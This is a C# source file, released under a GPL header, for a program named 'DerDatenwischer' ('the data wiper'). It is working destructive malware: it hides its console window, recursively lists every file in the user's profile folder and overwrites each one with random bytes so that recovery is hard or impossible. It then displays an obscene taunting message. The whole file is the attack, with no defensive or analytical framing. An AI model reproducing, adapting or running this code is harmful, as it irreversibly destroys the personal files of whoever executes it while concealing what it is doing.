/*
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

using System;
using System.IO;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Runtime.InteropServices;

namespace DerDatenwischer
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hwnd, int option);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        public static List<string> files = new List<string>();

        // recursively put listed files in a directory into the files variable
        public static List<string> ListFiles(string _directory)
        {

            try
            {
                foreach(string file in Directory.GetFiles(_directory))
                {
                    files.Add(file);
                }

                foreach(string directory in Directory.GetDirectories(_directory))
                {
                    ListFiles(directory);
                }
            }
            catch(Exception e)
            {
                Console.WriteLine(e.Message);
                return null;
            }
            return files;
        }

        // so we can overwrite the file, hopefully making it harder or impossible to recover.
        static void Corrupt(string _filename)
        {
            try
            {
                FileInfo info = new FileInfo(_filename);

                byte[] random = new byte[info.Length * 2];

                RandomNumberGenerator rng = RNGCryptoServiceProvider.Create();
                rng.GetBytes(random);

                File.WriteAllBytes(_filename, random);
            }
            catch(Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }

        static void Main(string[] _args)
        {
            var handle = GetConsoleWindow();

            ShowWindow(handle, SW_HIDE);

            string home = Environment.GetEnvironmentVariable("UserProfile") + @"\";

            ListFiles($"{home}");

            foreach(var file in files)
            {
                Corrupt(file);
            }

            ShowWindow(handle, SW_SHOW);

            Console.Title = "Fuck You!";
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("You've been fucked!");
            Console.ReadKey();
        }
    }
}
